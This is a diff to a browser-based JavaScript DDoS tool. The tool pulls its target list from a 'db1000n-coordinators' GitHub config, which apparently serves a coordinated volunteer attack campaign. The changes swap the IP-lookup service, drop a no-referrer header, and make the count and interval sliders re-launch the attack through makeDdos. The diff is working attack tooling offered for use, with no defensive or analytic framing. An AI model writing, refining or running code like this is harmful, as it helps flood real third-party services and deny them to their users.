@@ -1,4 +1,4 @@
-let ipApi = "http://ip-api.com/json/?fields=61439",
+let ipApi = "https://ipapi.co/json/",
 	targetLink = "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json",
 	targets = [],
 	attacketTargets = [],
@@ -55,9 +55,7 @@ function getLocatioInfo() {
 	setInterval(getLocatioInfo, 60000);
 	fetch(ipApi, {
 		method: "GET",
-
 		cache: "no-cache",
-		headers: { "Referrer-Policy": "no-referrer" },
 	})
 		.then((responce) => {
 			return responce.json();
@@ -73,12 +71,24 @@ function getLocatioInfo() {
 			alert("Неможливо отримати інформацію про ваше підключення");
 		});
 }
-
+selectInterval(count);
+selectTargets(count);
 counterRange.addEventListener("input", (e) => {
 	count = e.target.value;
-	selectTargets(count);
+	selectTargets(count, true);
 });
-function selectTargets(a = count) {
+intervalRange.addEventListener("input", (e) => {
+	interval = e.target.value;
+	selectInterval(interval, true);
+});
+function selectInterval(a = interval, b = false) {
+	intervalText.textContent = interval;
+	selectTargets(count);
+	if (b) {
+		makeDdos();
+	}
+}
+function selectTargets(a = count, b = false) {
 	counterText.textContent = a;
 	attacketTargets = [];
 	for (let i = 0; i < a; i++) {
@@ -87,13 +97,11 @@ function selectTargets(a = count) {
 	if (startBtn.classList.contains("clicked")) {
 		makeDdos();
 	}
+	if (b) {
+		makeDdos();
+	}
 }
-intervalRange.addEventListener("input", (e) => {
-	interval = e.target.value;
-	intervalText.textContent = interval;
-	selectTargets(count);
-	makeDdos();
-});
+
 startBtn.addEventListener("click", (e) => {
 	selectTargets(count);
 	makeDdos();
